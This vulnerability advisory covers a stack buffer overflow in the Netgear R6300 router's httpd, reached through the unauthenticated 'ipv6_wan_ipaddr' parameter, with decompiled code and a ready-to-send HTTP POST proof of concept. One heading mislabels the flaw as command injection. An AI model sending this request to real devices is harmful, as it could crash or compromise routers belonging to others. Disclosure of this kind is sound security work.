# Buffer Overflow Vulnerability in `ipv6_wan_ipaddr`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6300 Router                                         |
| Firmware Version     | V1.0.2.80_1.0.59                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`IPv6FixCgiMain` → `acosNvramConfig_set` → `IPv6CgiGetParam`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameter `ipv6_wan_ipaddr` |

2. Exploitation Path

```c
int __fastcall IPv6FixCgiMain(char *a1, int a2)
{
  ...
  char v12[256]; // [sp+18h] [-100h] BYREF
  ...
  websGetVar(a1, "ipv6_wan_ipaddr", v12);
  if ( !acosNvramConfig_match("ipv6_wan_ipaddr", v12) )
  {
    acosNvramConfig_set("ipv6_wan_ipaddr", v12);
    v4 = 1;
  }
  ...
}

int __fastcall IPv6CgiGetParam(int a1, const char *a2, char *a3)
{
  ...
  char v32[128]; // [sp+7Eh] [-182h] BYREF
  ...
  memset(v32, 0, sizeof(v32));
  ...
  if ( !strcmp(a2, "ipv6_wan") )
  {
    v10 = (const char *)acosNvramConfig_get("ipv6_wan_ipaddr");
    strcpy(v32, v10);
    ...
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: In the `httpd` binary, the `IPv6FixCgiMain` function at line 6 calls `websGetVar(a1, "ipv6_wan_ipaddr", v12)` to receive input. Although a 255-byte length restriction is applied, no further validation is performed. The input is then stored via `acosNvramConfig_set("ipv6_wan_ipaddr", v12)` at line 9. Subsequently, the `IPv6CgiGetParam` function retrieves this value at line 24 using `v10 = (const char *)acosNvramConfig_get("ipv6_wan_ipaddr")`, and copies it into the destination buffer `v32` via `strcpy(v32, v10)` at line 25. Since the buffer `v32` has a size of only 128 bytes, this results in a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/IPv6FixCgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: close

ipv6_wan_ipaddr=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```